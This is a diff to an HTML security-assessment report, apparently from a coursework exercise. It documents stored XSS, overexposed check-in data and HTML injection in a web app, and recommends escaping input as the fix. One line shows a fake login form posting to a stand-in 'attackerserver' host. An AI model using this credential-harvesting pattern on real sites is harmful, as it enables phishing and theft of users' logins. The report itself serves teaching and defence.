@@ -52,13 +52,14 @@
         <ul>
         <li>Location of Vulnerability: GET API executes javascript posted to the server by a malicious source.</li>
         
-        <li>Severity of Vulnerability: HIGH. XSS is one of the biggest security loopholes in the present day.
+        <li>Severity of Vulnerability: <span class="high">HIGH</span>. XSS is one of the biggest security loopholes in the present day.
             It may possibly compromise clients who expect the server to be secure, as malicious javascript can
-            be exected in their browser upon GET request.</li>
+            be exected in their browser upon GET request. This javascript code will literally be able to do almost
+            anything conceivable.</li>
         
         <li>Description of Injection: The data given to the server via the POST API is not escaped, and is
             stored in the database exact as it is entered. For example, I have replaced the login parameter
-            with some javascript code instead of a valid login and the results are show below. The first photo 
+            with some javascript code instead of a valid login and the results are shown below. The first photo 
             describes the parameters sent using the POST API and the second photo shows the data being stored
             in the database.
 
@@ -84,7 +85,7 @@
         <ul>
         <li>Location of Vulnerability: GET /checkins.json API can retrieve more data than it should be able to.</li>
         
-        <li>Severity of Vulnerability: HIGH. Databases may contain confidential or secure information and there is a 
+        <li>Severity of Vulnerability: <span class="high">HIGH</span>. Databases may contain confidential or secure information and there is a 
             huge privacy and security problem any time a third-party is able to freely access all data in a database.
             This problem is made even worse if the database stores raw (as opposed to encrypted) information -- one
             may freely access the database and collect usernames, passwords, and other information.</li>
@@ -105,15 +106,45 @@
 
         <h3>Issue #3 : HTML Injections</h3>
 
-        <img src="images/injectionattack.png" alt="Injection Attack" title="Postman interface to make Injection Attack" />
+        <ul>
+        <li>Location of Vulnerability: GET API renders malicious HTML code on the web browser, instead of the 
+            original HTML of the site.</li>
+        
+        <li>Severity of Vulnerability: <span class="high">HIGH</span>. Being able to render malicious HTML on a user's browser is not only
+            annoying, but a huge security risk. By doing this, an attacker could provide the user with a false
+            interface (i.e. the interface built with the malicious HTML) and redirect any information the user
+            provides to their attack server. Examples of this are fake login pages, personal details forms, etc. </li>
 
-        <img src="images/injectionresult.png" alt="Injection Result" title="Client interface being hit by Injection Attack" />
+        <li>Description of Injection: The data given to the server via the POST API is not escaped, and is
+            stored in the database exact as it is entered. In the example below, I have replaced the login field
+            with some malicious HTML code. This code prints what I want to the screen, and also comments out the
+            entirety of the original HTML that is supposed to be rendered on the browser. The photo below shows 
+            the HTML code I sent to the server using the POST API.
+
+        <table class="galleryTable"><tr><td><img src="images/injectionattack.png" alt="Injection Attack" title="Postman interface to make Injection Attack" /></td></tr></table></li>
+
+        <li>Result of Injection: As can be seen in the image below, when a GET / request is sent to the server, the
+            malicious HTML stored in the database is returned to the client. This results in the HTML being rendered
+            on the browser instead of the proper content. In this case, I have provided some rather trivial HTML code
+            and not done much, but conceivably the repercussions of HTML injection could be far worse. I could have
+            replicated the exact same code of the site so that the user will not suspect anything is wrong, and steal 
+            any data the user inputs using a code like <code>form method="POST" action="http://attackerserver/login.php"
+            </code> to route to an attacker server.
+
+        <table class="galleryTable"><tr><td><img src="images/injectionresult.png" alt="Injection Result" title="Client interface being hit by Injection Attack" /></td></tr></table></li>
+
+        <li>Resolution: The solution to this is pretty similar to the solution to prevent XSS with javascript. Once
+            these characters are escaped and checked, the HTML will not be able to run on a user's browser.</li>
+        </ul>
 
         <h3>Conclusion</h3>
 
         <p>
         Most of the security vulnerabilities in this web application are serious compromises, but they are all also relatively
-        easy fixes for anyone attempting to plug these security loopholes. 
+        easy fixes for anyone attempting to plug these security loopholes. The time costs of making this fixes is also not high,
+        as escaping characters and checking can just be done with a few lines of code. I recommend that any future web applications
+        have these checks as a minimum level of security against unauthorized database access of injection of HTML and javascript
+        code that has the potential to mess with the browsers of users.
         </p>
 
 </body>
